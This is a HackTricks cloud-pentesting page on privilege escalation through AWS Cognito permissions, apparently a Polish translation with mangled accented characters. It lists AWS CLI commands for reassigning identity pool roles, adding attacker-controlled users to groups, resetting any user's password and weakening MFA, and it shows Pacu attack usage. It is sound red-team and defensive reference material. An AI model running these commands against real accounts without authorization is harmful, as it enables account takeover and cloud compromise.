# AWS - Cognito Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Cognito

Aby uzyska wicej informacji o Cognito, sprawd藕:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Zbieranie powiadcze z Identity Pool

Poniewa偶 Cognito mo偶e przyzna **powiadczenia roli IAM** zar贸wno **uwierzytelnionym**, jak i **nieuwierzytelnionym** **u偶ytkownikom**, jeli znajdziesz **ID Identity Pool** aplikacji (powinno by zakodowane w niej), mo偶esz uzyska nowe powiadczenia, a tym samym privesc (w ramach konta AWS, na kt贸rym prawdopodobnie nie miae wczeniej 偶adnych powiadcze).

Aby uzyska wicej informacji, [**sprawd藕 t stron**](../aws-unauthenticated-enum-access/#cognito).

**Potencjalny wpyw:** Bezporedni privesc do roli usugowej przypisanej do u偶ytkownik贸w nieautoryzowanych (a prawdopodobnie tak偶e do tej przypisanej do u偶ytkownik贸w autoryzowanych).

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Dziki temu uprawnieniu mo偶esz **przyzna dowoln rol cognito** uwierzytelnionym/nieuwierzytelnionym u偶ytkownikom aplikacji cognito.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374"
```
Jeli aplikacja cognito **nie ma wczonych u偶ytkownik贸w nieautoryzowanych**, mo偶esz r贸wnie偶 potrzebowa uprawnienia `cognito-identity:UpdateIdentityPool`, aby je wczy.

**Potencjalny wpyw:** Bezporednie privesc do dowolnej roli cognito.

### `cognito-identity:update-identity-pool`

Napastnik z tym uprawnieniem m贸gby ustawi na przykad Cognito User Pool pod swoj kontrol lub innego dostawc to偶samoci, gdzie mo偶e si zalogowa jako **spos贸b na uzyskanie dostpu do tego Cognito Identity Pool**. Nastpnie, po prostu **logujc si** na tym dostawcy u偶ytkownik贸w, **pozwoli mu to uzyska dostp do skonfigurowanej roli uwierzytelnionej w Identity Pool**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Mo偶liwe jest r贸wnie偶 **nadu偶ycie tego uprawnienia, aby zezwoli na podstawow autoryzacj**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potencjalny wpyw**: Kompromitacja skonfigurowanej uwierzytelnionej roli IAM w obrbie puli to偶samoci.

### `cognito-idp:AdminAddUserToGroup`

To uprawnienie pozwala na **dodanie u偶ytkownika Cognito do grupy Cognito**, w zwizku z tym atakujcy m贸gby nadu偶y tego uprawnienia, aby doda u偶ytkownika pod swoj kontrol do innych grup z **lepszymi** uprawnieniami lub **innymi rolami IAM**:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potencjalny wpyw:** Privesc do innych grup Cognito i r贸l IAM przypisanych do grup User Pool.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Napastnik z tymi uprawnieniami m贸gby **tworzy/aktualizowa grupy** z **ka偶d rol IAM, kt贸ra mo偶e by u偶ywana przez skompromitowanego dostawc to偶samoci Cognito** i uczyni skompromitowanego u偶ytkownika czci grupy, uzyskujc dostp do wszystkich tych r贸l:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potencjalny wpyw:** Privesc do innych r贸l IAM Cognito.

### `cognito-idp:AdminConfirmSignUp`

To uprawnienie pozwala na **potwierdzenie rejestracji**. Domylnie ka偶dy mo偶e zalogowa si do aplikacji Cognito, jeli to zostanie pozostawione, u偶ytkownik m贸gby utworzy konto z dowolnymi danymi i potwierdzi je za pomoc tego uprawnienia.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potencjalny wpyw:** Porednie privesc do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w, jeli mo偶esz zarejestrowa nowego u偶ytkownika. Porednie privesc do innych funkcji aplikacji, mogc potwierdzi dowolne konto.

### `cognito-idp:AdminCreateUser`

To uprawnienie pozwolioby atakujcemu na utworzenie nowego u偶ytkownika w obrbie puli u偶ytkownik贸w. Nowy u偶ytkownik jest tworzony jako aktywny, ale bdzie musia zmieni swoje haso.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potencjalny wpyw:** Bezporedni privesc do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w. Poredni privesc do innych funkcji aplikacji, mogc stworzy dowolnego u偶ytkownika.

### `cognito-idp:AdminEnableUser`

Te uprawnienia mog pom贸c w bardzo skrajnym przypadku, w kt贸rym atakujcy znalaz dane uwierzytelniajce wyczonego u偶ytkownika i musi **ponownie je wczy**.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potencjalny wpyw:** Porednie privesc do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w i uprawnie u偶ytkownika, jeli atakujcy miaby powiadczenia dla wyczonego u偶ytkownika.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

To uprawnienie pozwala na logowanie si za pomoc [**metody ADMIN\_USER\_PASSWORD\_AUTH**](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Aby uzyska wicej informacji, kliknij w link.

### `cognito-idp:AdminSetUserPassword`

To uprawnienie pozwolioby atakujcemu na **zmian hasa dowolnego u偶ytkownika**, co umo偶liwioby mu podszywanie si pod dowolnego u偶ytkownika (kt贸ry nie ma wczonego MFA).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potencjalny wpyw:** Bezporedni privesc do potencjalnie dowolnego u偶ytkownika, co daje dostp do wszystkich grup, do kt贸rych nale偶y ka偶dy u偶ytkownik, oraz dostp do roli IAM uwierzytelnionej w Identity Pool.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Napastnik m贸gby potencjalnie nadu偶y tej uprawnienia, aby ustawi telefon kom贸rkowy pod swoj kontrol jako **SMS MFA u偶ytkownika**.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Podobnie jak w poprzednim przypadku, to uprawnienie mo偶e by u偶ywane do ustawiania preferencji MFA u偶ytkownika w celu ominicia ochrony MFA.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Podobnie jak w poprzednim przypadku, to uprawnienie mo偶e by u偶ywane do ustawiania preferencji MFA puli u偶ytkownik贸w w celu ominicia ochrony MFA.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Mo偶liwe jest r贸wnie偶 zaktualizowanie puli u偶ytkownik贸w, aby zmieni polityk MFA. [Sprawd藕 cli tutaj](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potential Impact:** Porednie privesc do potencjalnie dowolnego u偶ytkownika, kt贸rego atakujcy zna dane uwierzytelniajce, co mo偶e pozwoli na ominicie ochrony MFA.

### `cognito-idp:AdminUpdateUserAttributes`

Atakujcy z tym uprawnieniem m贸gby zmieni adres e-mail lub numer telefonu lub jakikolwiek inny atrybut u偶ytkownika pod jego kontrol, aby spr贸bowa uzyska wicej uprawnie w podstawowej aplikacji.\
To pozwala na zmian adresu e-mail lub numeru telefonu i ustawienie go jako zweryfikowanego.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potencjalny wpyw:** Potencjalne porednie privesc w podstawowej aplikacji korzystajcej z Cognito User Pool, kt贸ra przyznaje uprawnienia na podstawie atrybut贸w u偶ytkownika.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Napastnik z tym uprawnieniem m贸gby **utworzy nowego Klienta User Pool o mniejszych ograniczeniach** ni偶 ju偶 istniejce klienty pool. Na przykad, nowy klient m贸gby pozwala na wszelkiego rodzaju metody uwierzytelniania, nie mie 偶adnego sekretu, mie wyczon revokacj token贸w, pozwala na du偶szy okres wa偶noci token贸w...

To samo mo偶na zrobi, jeli zamiast tworzenia nowego klienta, **zmodyfikowany zostanie istniejcy**.

W [**wierszu polece**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (lub [**aktualizacji**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) mo偶esz zobaczy wszystkie opcje, sprawd藕 to!
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potencjalny wpyw:** Potencjalne porednie privesc do u偶ytkownika autoryzowanego w Identity Pool u偶ywanego przez User Pool poprzez utworzenie nowego klienta, kt贸ry agodzi rodki bezpieczestwa i umo偶liwia atakujcemu zalogowanie si jako u偶ytkownik, kt贸rego by w stanie utworzy.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Atakujcy m贸gby nadu偶y tego uprawnienia, aby tworzy u偶ytkownik贸w, przesyajc plik csv z nowymi u偶ytkownikami.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
(W przypadku, gdy tworzysz nowe zadanie importu, mo偶esz r贸wnie偶 potrzebowa uprawnienia iam passrole, jeszcze tego nie testowaem).

**Potencjalny wpyw:** Bezporednie privesc do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w. Porednie privesc do innych funkcji aplikacji, mogc tworzy dowolnego u偶ytkownika.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Napastnik m贸gby stworzy nowego dostawc to偶samoci, aby m贸c **zalogowa si przez tego dostawc**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potencjalny wpyw:** Bezporednie privesc do roli IAM puli to偶samoci dla uwierzytelnionych u偶ytkownik贸w. Porednie privesc do innych funkcji aplikacji, mogc tworzy dowolnego u偶ytkownika.

### cognito-sync:\* Analiza

To bardzo powszechne uprawnienie domylnie w rolach Cognito Identity Pools. Nawet jeli u偶ycie znaku wieloznacznego w uprawnieniach zawsze wyglda 藕le (szczeg贸lnie w przypadku AWS), **przyznane uprawnienia nie s super przydatne z perspektywy atakujcego**.

To uprawnienie pozwala na odczyt informacji o u偶ytkownikach z Puli To偶samoci i identyfikator贸w to偶samoci w Puli To偶samoci (co nie jest informacj wra偶liw).\
Identyfikatory to偶samoci mog mie przypisane [**Zbiory Danych**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html), kt贸re s informacjami o sesjach (AWS definiuje to jako **zapisana gra**). Mo偶e si zdarzy, 偶e zawieraj one jaki rodzaj wra偶liwych informacji (ale prawdopodobiestwo jest do niskie). Mo偶esz znale藕 na [**stronie enumeracji**](../aws-services/aws-cognito-enum/) jak uzyska dostp do tych informacji.

Atakujcy m贸gby r贸wnie偶 wykorzysta te uprawnienia do **zapisania si do strumienia Cognito, kt贸ry publikuje zmiany** w tych zbiorach danych lub **lambdy, kt贸ra wyzwala si na zdarzenia Cognito**. Nie widziaem, aby to byo u偶ywane, i nie spodziewabym si tutaj wra偶liwych informacji, ale nie jest to niemo偶liwe.

### Narzdzia automatyczne

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), framework do eksploatacji AWS, teraz zawiera moduy "cognito\_\_enum" i "cognito\_\_attack", kt贸re automatyzuj enumeracj wszystkich zasob贸w Cognito w koncie i oznaczaj sabe konfiguracje, atrybuty u偶ytkownik贸w u偶ywane do kontroli dostpu itp., a tak偶e automatyzuj tworzenie u偶ytkownik贸w (w tym wsparcie MFA) i eskalacj uprawnie na podstawie modyfikowalnych atrybut贸w niestandardowych, u偶ywalnych powiadcze puli to偶samoci, r贸l, kt贸re mo偶na przyj w tokenach id itp.

Aby uzyska opis funkcji modu贸w, zobacz cz 2 [postu na blogu](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Aby uzyska instrukcje instalacji, zobacz g贸wn stron [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### U偶ycie

Przykad u偶ycia cognito\_\_attack do pr贸by tworzenia u偶ytkownika i wszystkich wektor贸w privesc przeciwko danej puli to偶samoci i klientowi puli u偶ytkownik贸w:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Przykad u偶ycia cognito\_\_enum do zebrania wszystkich pul u偶ytkownik贸w, klient贸w pul u偶ytkownik贸w, pul to偶samoci, u偶ytkownik贸w itp. widocznych w bie偶cym koncie AWS:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) to narzdzie CLI w pythonie, kt贸re implementuje r贸偶ne ataki na Cognito, w tym eskalacj uprawnie.

#### Instalacja
```bash
$ pip install cognito-scanner
```
#### U偶ycie
```bash
$ cognito-scanner --help
```
Aby uzyska wicej informacji, sprawd藕 [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Ucz si i wicz AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Ucz si i wicz GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
